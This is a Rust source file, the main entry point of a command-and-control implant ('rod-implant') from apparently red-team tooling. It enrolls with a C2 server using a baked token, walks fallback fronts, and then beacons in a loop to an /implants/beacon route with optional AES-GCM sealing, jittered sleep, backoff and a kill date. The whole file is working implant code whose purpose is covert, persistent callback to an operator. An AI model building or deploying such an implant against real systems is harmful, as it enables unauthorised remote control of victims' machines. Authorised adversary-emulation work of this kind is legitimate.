mod baked;
mod beacon;
mod envelope;
mod enroll;
mod handlers;
mod profile;
mod sensitive;
mod transport;
mod trust;
mod verify;
mod wire;

use std::sync::{Arc, Mutex};

// The Rust reference implant (architecture.md Sec 12.2): the reach implant
// for targets a managed runtime cannot serve, speaking the same wire
// protocol as the .NET reference. The fielded shape runs entirely off the
// bake: the profile is the configuration and nothing else, arguments and
// environment are ignored, and the console stays silent beyond the fatal
// one-liners. The dev shape (empty bake) runs from ROD_* environment
// variables and narrates to stderr.

fn main() {
    let Some(profile) = profile::Profile::from_baked(baked::PROFILE)
        .or_else(profile::Profile::from_env) else {
        eprintln!("rod-implant: this build carries no baked profile and no ROD_* environment; nothing to run");
        std::process::exit(2);
    };
    if profile.token.is_empty() {
        eprintln!("rod-implant: no enrollment credential (bake or ROD_STAGER_TOKEN)");
        std::process::exit(2);
    }
    if profile.kill_date_passed() {
        eprintln!("rod-implant: kill date has passed; refusing to run");
        std::process::exit(1);
    }
    if profile.mode == "stream" {
        // The stream mode rides the WebSocket beacon this build does not
        // carry; refusing at startup beats enrolling into a contact shape
        // the binary cannot serve.
        eprintln!("rod-implant: this build serves the poll cycle; build it mode 'poll'");
        std::process::exit(2);
    }

    // The enrollment walk (architecture.md Sec 8): the primary enroll URL
    // then the baked fallbacks. A transport failure walks to the next entry
    // (the credential is unspent against a server that never answered); a
    // definitive refusal ends the run.
    let enroll_walk = profile.enroll_walk();
    let mut enrollment = None;
    let mut last_error = String::new();
    for url in &enroll_walk {
        let keys = enroll::KeyPair::generate();
        match enroll::enroll(url, &profile, &keys) {
            Ok(enrolled) => {
                enrollment = Some(enrolled);
                break;
            }
            Err(err) if err.starts_with("enroll transport") || err.starts_with("enroll read") => {
                last_error = err;
                continue;
            }
            Err(refusal) => {
                eprintln!("rod-implant: {refusal}");
                std::process::exit(1);
            }
        }
    }
    let Some(enrollment) = enrollment else {
        eprintln!("rod-implant: no enroll front answered ({last_error})");
        std::process::exit(1);
    };
    eprintln!(
        "rod-implant: enrolled {} into engagement {}",
        enrollment.implant_id, enrollment.engagement_id
    );

    // The contact walk: the same fronts as beacon URLs (scheme and authority
    // plus the fixed route). Contacts never re-enroll -- the artifact's
    // identity is bound, and the walk only crosses fronts.
    let contact_walk: Vec<String> = enroll_walk
        .iter()
        .map(|url| contact_url(url))
        .collect();
    let seal = if profile.contact_envelope == "aesgcm" {
        envelope::parse_baked_key(&profile.envelope_key)
    } else {
        None
    };
    let cadence: handlers::Cadence = Arc::new(Mutex::new((profile.sleep_seconds, profile.jitter_seconds)));
    let mut agent = beacon::Beacon::new(
        enrollment.implant_id.clone(),
        &profile.verbs,
        Arc::clone(&cadence),
        enrollment.ca_chain.clone(),
        seal,
        profile.request_timeout_seconds,
        profile.kill_date.clone(),
    );

    let mut walk_index = 0usize;
    let mut failures = 0u32;
    loop {
        if agent.kill_date_passed() {
            return;
        }
        let url = &contact_walk[walk_index % contact_walk.len()];
        match agent.run_once(url) {
            Ok(beacon::Cycle::Handshaken) => failures = 0,
            Ok(beacon::Cycle::Terminal) => {
                eprintln!("rod-implant: handshake refused; terminating");
                return;
            }
            Err(err) => {
                eprintln!("rod-implant: {err}");
                walk_index += 1;
                failures += 1;
            }
        }
        agent.sleep_with_backoff(failures);
    }
}

/// The contact URL off an enroll URL: the scheme and authority it names plus
/// the fixed envelope route, any path dropped (the .NET ContactUrl rule).
fn contact_url(enroll_url: &str) -> String {
    let scheme_at = enroll_url.find("://").unwrap_or(0);
    let after = &enroll_url[scheme_at + 3..];
    let authority = after.split('/').next().unwrap_or(after);
    let scheme = if scheme_at == 0 { "https" } else { &enroll_url[..scheme_at] };
    format!("{scheme}://{authority}/implants/beacon")
}
